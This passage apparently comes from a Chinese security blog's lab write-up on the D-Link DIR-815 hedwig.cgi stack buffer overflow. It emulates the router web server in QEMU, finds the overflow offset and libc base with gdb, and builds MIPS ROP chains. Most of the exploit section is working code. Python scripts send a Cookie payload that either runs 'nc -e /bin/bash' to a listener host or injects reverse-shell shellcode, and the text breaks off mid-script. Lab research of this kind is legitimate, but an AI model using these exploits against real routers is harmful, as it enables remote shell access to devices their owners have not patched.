        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
        <span class="token constant">CGI</span>            <span class="token punctuation">{</span> cgi <span class="token punctuation">}</span>
        Imagemap    <span class="token punctuation">{</span> map <span class="token punctuation">}</span>
        Redirect    <span class="token punctuation">{</span> url <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    External
    <span class="token punctuation">{</span>
        <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> php <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


Server
<span class="token punctuation">{</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>
    ServerId <span class="token string">"1234"</span>
    Family inet
    <span class="token keyword">Interface</span> <span class="token class-name">eth0</span> <span class="token shell-comment comment">#对应qemu虚拟机的网卡</span>
    Address <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">79.143</span> <span class="token shell-comment comment">#对于qemu虚拟机IP</span>
    Port <span class="token string">"1234"</span> <span class="token shell-comment comment">#对应未被使用的端口</span>
    Virtual
    <span class="token punctuation">{</span>
        AnyHost
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span>web
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>php <span class="token punctuation">}</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> router_info<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>phpcgi <span class="token punctuation">{</span> post_login<span class="token punctuation">.</span>xml <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        Control
        <span class="token punctuation">{</span>
            Alias <span class="token operator">/</span><span class="token constant">HNAP1</span>
            Location <span class="token operator">/</span>htdocs<span class="token operator">/</span><span class="token constant">HNAP1</span>
            External
            <span class="token punctuation">{</span>
                <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>hnap <span class="token punctuation">{</span> hnap <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            IndexNames <span class="token punctuation">{</span> index<span class="token punctuation">.</span>hnap <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>的qemu网络配置中有提到。</p>
<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。</p>
<pre class=" language-sh"><code class="language-sh">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic</code></pre>
<p>测试能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
<pre class=" language-sh"><code class="language-sh">sudo scp -r squashfs-root root@192.168.79.143:/root/</code></pre>
<p>之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的<code>/usr/sbin/phpcgi</code>，<code>/usr/sbin/hnap</code>。</p>
<p>copy.sh，需要进入squashfs-root目录使用，脚本最后启动了http服务。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f conf</code></pre>
<p>之后可以在浏览器访问conf文件中配置的192.168.79.143:1234/hedwig.cgi</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/hedwigchi%E6%96%87%E4%BB%B6.png" alt=""></p>
<p>或者在宿主机中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。</p>
<pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
*   Trying 192.168.79.143...
* Connected to 192.168.79.143 (192.168.79.143) port 1234 (#0)
> POST /hedwig.cgi HTTP/1.1
> Host: 192.168.79.143:1234
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie: uid=zh
> Content-Length: 8
> 
< HTTP/1.1 200 OK
< Server: Linux, HTTP/1.1, 
< Date: Sun, 24 May 2020 01:00:46 GMT
< Transfer-Encoding: chunked
< Content-Type: text/xml
< 
* Connection #0 to host 192.168.79.143 left intact
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>% </code></pre>
<p>然后在mips虚拟机查看log文件：</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# cat /log
Sun May 24 00:58:11 2020 [1109] *** Mathopd/1.6b9 starting
Sun May 24 00:58:20 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/]
Sun May 24 00:58:43 2020 [1109] process_headers: method[GET], nheaders=[6], URL[/hedwig.cgi]
Sun May 24 00:58:43 2020 [1109] child process 1111 exited with status 255
Sun May 24 00:59:43 2020 [1109] script timeout to 192.168.79.145[52472]
Sun May 24 01:00:46 2020 [1109] process_headers: method[POST], nheaders=[4], URL[/hedwig.cgi]
Sun May 24 01:00:46 2020 [1109] child process 1112 exited with status 255</code></pre>
<p>到这里可以看到我们需要的web服务器以及启动了。</p>
<h2 id="5-2-gdbbserver调试"><a href="#5-2-gdbbserver调试" class="headerlink" title="5.2-gdbbserver调试"></a>5.2-gdbbserver调试</h2><p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no REQUEST</message></hedwig>root@debian-mipsel:~/squashfs-root#</code></pre>
<p>返回no REQUEST，查看IDA静态反汇编得知没有指定环境变量<code>REQUEST_METHOD</code>的值。所以想要触发漏洞进行调试的话，还是需要通过export 设置相关环境变量。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
HTTP/1.1 200 OK
Content-Type: text/xml
#之前分析过因为没有post数据
<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>使用<code>echo 'uid=1234'| /htdocs/web/hedwig.cgi</code>运行成功。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# echo 'uid=1234'| /htdocs/web/hedwig.cgi 
root@debian-mipsel:~/squashfs-root# </code></pre>
<p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>可以编写以下脚本进行动态调试</p>
<p>debug.sh，gdbsever 192.168.79.145是宿主机IP，6666是qemu监听端口。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="`cat content`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>宿主机gdb调试</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin
set architecture mips
target remote 192.168.79.143:6666 #对应qemu地址和端口
c</code></pre>
<p>得到溢出地址是0x68423668，利用脚本计算偏移为1009</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gdbseveroffset.png" alt=""></p>
<pre class=" language-sh"><code class="language-sh">#./patternLocOffset.py -s 0x68423668 -l 2000 
[*] Create pattern string contains 2000 characters ok!
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 1009 (adjusted another-endian)
[+] take time: 0.0007 s</code></pre>
<p>接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。</p>
<p>利用/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps ，<strong>a&amp;b 先执行a，在执行b，无论a成功与否都会执行b</strong>。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。</p>
<pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# export CONTENT_LENGTH="100"
root@debian-mipsel:~/squashfs-root# export CONTENT_TYPE="application/x-www-form-urlencoded"
root@debian-mipsel:~/squashfs-root# export HTTP_COOKIE="uid=1234"
root@debian-mipsel:~/squashfs-root# export REQUEST_METHOD="POST"
root@debian-mipsel:~/squashfs-root# export REQUEST_URI="/hedwig.cgi"

root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
[10] 1052
cat: /proc/pid/maps: No such file or directory
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/pid/maps
[11] 1054
cat: /proc/pid/maps: No such file or directory
[10]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps 
[12] 1056
00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin
0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin
0042d000-0042f000 rwxp 00000000 00:00 0          [heap]
77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0
77f92000-77fa1000 ---p 00000000 00:00 0 
77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0
77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0
77fa3000-77fa8000 rw-p 00000000 00:00 0 
77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1
77fd1000-77fe1000 ---p 00000000 00:00 0 
77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1
77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0
77ff5000-77ff6000 rw-p 00000000 00:00 0 
77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0
77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0
7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]

[11]+  Stopped                 /htdocs/web/hedwig.cgi
root@debian-mipsel:~/squashfs-root#</code></pre>
<h2 id="5-3-编写exp"><a href="#5-3-编写exp" class="headerlink" title="5.3-编写exp"></a>5.3-编写exp</h2><p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
<ol>
<li><p>system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成<code>nc -e /bin/bash 192.168.79.145 9999</code></p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x45988
gadget2 = 0x159cc

cmd = 'nc -e /bin/bash 192.168.79.145 9999'
padding = 'A' * 973 #1009-4*9
padding += p32(base_addr + system_addr_1) # s0
padding += p32(base_addr + gadget2)       # s1
padding += 'A' * 4                        # s2
padding += 'A' * 4                        # s3
padding += 'A' * 4                        # s4
padding += 'A' * 4                           # s5
padding += 'A' * 4                        # s6
padding += 'A' * 4                        # s7
padding += 'A' * 4                        # fp
padding += p32(base_addr + gadget1)       # ra
padding += 'B' * 0x10
padding += cmd

f = open("context",'wb')
f.write(padding)
f.close()</code></pre>
<p>生成的context通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE="uid=`cat context`"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=1234"|/htdocs/web/hedwig.cgi
#echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
<p>在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp9999.png" alt=""></p>
</li>
<li><p>利用sleep(1)调用shellcode</p>
<p>这里的shllcode作用是给指定的IP地址和端口反弹shell，根据<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">文章</a>修改其中的socket反向连接IP，端口没有改变还是31337。</p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"

shellcode = ""
shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
shellcode += "\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.79.145
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"

libc_base = 0x77f34000
sleep = 0x56BD0 #sleep jr ra 0x7678edf4
gadget1 = 0x57E50
gadget2 = 0x3B8A8
gadget3 = 0x14F28
gadget4 = 0x1DD08#0x15C84#0xBB44

payload = 'A' * 973 #1009-9*4
payload += 'A' * 4                           # s0
payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() && move $ra,$(sp+0x24) && jr s2
payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
payload += 'A' * 4                        # s3
payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") && jr shellcode
payload += 'A' * 4                           # s5
payload += 'A' * 4                        # s6
payload += 'A' * 4                        # s7
payload += 'A' * 4                        # fp
payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") && jr s1

payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() && move s1,$(sp+0x18) && jr $s4

payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
payload += shellcode

f = open("exploit2",'wb+')
f.write(payload)
f.close()</code></pre>
<p>生成的exploit2通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh运行得到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp31337.png" alt=""></p>
</li>
</ol>
<p>利用HTTP报文获取shell,其实现在mips虚拟机相当于一个开启了部分web服务的DIR815路由器，我们可以通过发送http报文获取shell。</p>
<p>利用system函数</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token string">"nc -e /bin/bash 192.168.79.145 9999"</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/httpshell.png" alt=""></p>
<p>利用sleep调用shellcode(反弹shell)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">:</span>

    shellcode <span class="token operator">=</span> <span class="token string">""</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"</span>
    <span class="token comment" spellcheck="true">#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"</span><span class="token comment" spellcheck="true">#192.168.79.145</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24\x0c\x09\x09\x01"</span>

    sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span> <span class="token comment" spellcheck="true">#sleep jr ra 0x7678edf4</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
    gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
    gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span><span class="token comment" spellcheck="true">#0x15C84#0xBB44</span>

    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset <span class="token comment" spellcheck="true">#1009-9*4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>

    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

    payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
    payload <span class="token operator">+=</span> shellcode

    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>

    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
